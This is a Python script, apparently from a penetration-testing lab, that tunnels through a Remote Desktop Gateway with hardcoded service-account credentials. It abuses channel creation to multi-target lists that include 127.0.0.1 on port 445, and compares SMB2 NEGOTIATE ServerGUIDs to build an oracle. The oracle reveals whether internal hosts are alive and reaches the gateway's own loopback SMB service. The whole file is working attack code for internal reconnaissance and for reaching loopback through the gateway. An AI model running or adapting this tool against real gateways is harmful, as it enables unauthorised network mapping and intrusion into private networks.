#!/usr/bin/env python3
"""Oracle: does create([host, 127.0.0.1], 445) land on host or loopback?

SMB2 NEGOTIATE response: NBSS(4) + SMB2 hdr(64) + struct: ss(2) secmode(2)
dialect(2) ctxcnt(2) then ServerGUID(16) -> GUID at data[76:92].
Baseline: loopback-only channel GUID (gateway). Then:
  H1 [DC, 127.0.0.1] x5   -> live host first: GUID == DC's every time?
  H2 [DEAD, 127.0.0.1] x5 -> GUID == gateway's every time?
"""
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/kali/workspace/RDetour")
from rdetour import RDGTunnel, pkt, smb2_negotiate  # noqa: E402

GW = "ecorp-rds.ecorp.local"
DEAD = "192.168.15.99"
DC = "192.168.15.40"


def names_body(names, port):
    body = struct.pack("<BB", len(names), 0) + struct.pack("<HH", port, 3)
    for h in names:
        n = h.encode("utf-16-le") + b"\x00\x00"
        body += struct.pack("<H", len(n)) + n
    return body


def cycle(t, names, tag):
    """create -> negotiate -> GUID -> close. Returns guid hex or None."""
    t.send_packet(pkt(0x8, names_body(names, 445)))
    p = t.recv_packet(timeout=40)
    if not (p and p[0] == 0x9 and struct.unpack("<I", p[1][0:4])[0] == 0):
        hr = struct.unpack("<I", p[1][0:4])[0] if p and p[0] == 0x9 else None
        print(f"  [{tag}] DENIED hr={hr and hex(hr)}", flush=True)
        return "DENIED"
    t.channel_open = True
    t._srv_closed_channel = False
    t.write(smb2_negotiate())
    r = t.recv_packet(timeout=8)
    guid = None
    if r and r[0] == 0xA and len(r[1]) > 4:
        ln = min(struct.unpack("<H", r[1][:2])[0], len(r[1]) - 2)
        data = r[1][2:2 + ln]
        if len(data) >= 92:
            guid = data[76:92].hex()
    t.close_channel()
    print(f"  [{tag}] guid={guid}", flush=True)
    return guid


def main():
    socket.setdefaulttimeout(20)
    t = RDGTunnel(GW, user="svcaccount", password="svcaccount",
                  domain="ECORP.local", verbose=False, connect_timeout=10)
    t.establish(auth_timeout=8)
    print("=== baseline: loopback-only ===", flush=True)
    gw_guid = cycle(t, ["127.0.0.1"], "base/lo")
    dc_guid = cycle(t, [DC], "base/dc")
    print(f"gateway guid = {gw_guid}\nDC guid       = {dc_guid}\n", flush=True)

    print("=== H1: [DC, 127.0.0.1] x5 ===", flush=True)
    h1 = [cycle(t, [DC, "127.0.0.1"], f"h1/{i}") for i in range(5)]
    print("=== H2: [DEAD, 127.0.0.1] x5 ===", flush=True)
    h2 = [cycle(t, [DEAD, "127.0.0.1"], f"h2/{i}") for i in range(5)]

    def verdict(res, expect):
        return all(g == expect for g in res)

    print(f"\nH1 all == DC guid (live host wins race): "
          f"{verdict(h1, dc_guid)}", flush=True)
    print(f"H2 all == GW guid (loopback fallback when dead): "
          f"{verdict(h2, gw_guid)}", flush=True)
    print("\nORACLE " + ("WORKS — clean host-up/down classification"
          if verdict(h1, dc_guid) and verdict(h2, gw_guid)
          else "UNRELIABLE — race picks randomly"), flush=True)
    t.close()


if __name__ == "__main__":
    main()
